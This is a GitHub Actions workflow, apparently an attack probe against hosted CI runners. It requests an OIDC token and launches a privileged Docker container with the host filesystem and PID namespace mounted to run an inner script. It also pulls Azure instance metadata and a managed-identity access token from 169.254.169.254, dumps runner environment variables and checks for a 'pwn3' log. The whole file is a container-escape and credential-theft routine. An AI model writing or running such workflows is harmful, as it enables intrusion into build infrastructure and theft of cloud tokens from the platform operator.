name: "HC OIDC Primer v13c - Python Script Writer No Heredoc"
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  primer:
    runs-on: ubuntu-latest
    steps:
      - name: "Step 1: Get HC OIDC token"
        id: hc_token
        run: |
          echo "=== REQUESTING HC OIDC TOKEN ==="
          RESPONSE=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro")
          HC_JWT=$(echo "$RESPONSE" | jq -r '.value' 2>/dev/null)
          HC_JWT_LEN=$(printf '%s' "$HC_JWT" | wc -c)
          echo "HC_JWT_LEN=$HC_JWT_LEN"
          echo "hc_jwt=$HC_JWT" >> "$GITHUB_OUTPUT"

      - name: "Step 2: Write inner script via python3"
        run: |
          python3 -c "
          import base64, os
          script = base64.b64decode(b'')
          with open('/tmp/inner_v13c.sh', 'wb') as f:
              f.write(script)
          os.chmod('/tmp/inner_v13c.sh', 0o755)
          print('inner script written: %d bytes' % len(script))
          "

      - name: "Step 3: Run privileged docker with inner script"
        env:
          HC_OIDC_TOKEN: ${{ steps.hc_token.outputs.hc_jwt }}
        run: |
          docker run --rm --privileged --pid=host --network=host \
            -v /:/host \
            -v /tmp/inner_v13c.sh:/inner.sh \
            -e HC_OIDC_TOKEN="${HC_OIDC_TOKEN}" \
            alpine:latest \
            /bin/sh /inner.sh

      - name: "Step 4: IMDS + MSI + ENV from runner"
        run: |
          echo "=== STEP 4: IMDS from runner ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq '{
              vmId: .compute.vmId,
              name: .compute.name,
              subscriptionId: .compute.subscriptionId,
              tags: .compute.tags
            }' || true
          echo "=== MSI from runner ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || true
          echo ""
          echo "=== ENV ==="
          env | grep -iE "ACTIONS|GITHUB|RUNNER" | grep -v "_TOKEN_REQUEST" | grep -v "SECRET" || true
          cat /tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_FOUND" || echo "PWN3_LOG_NOT_FOUND"
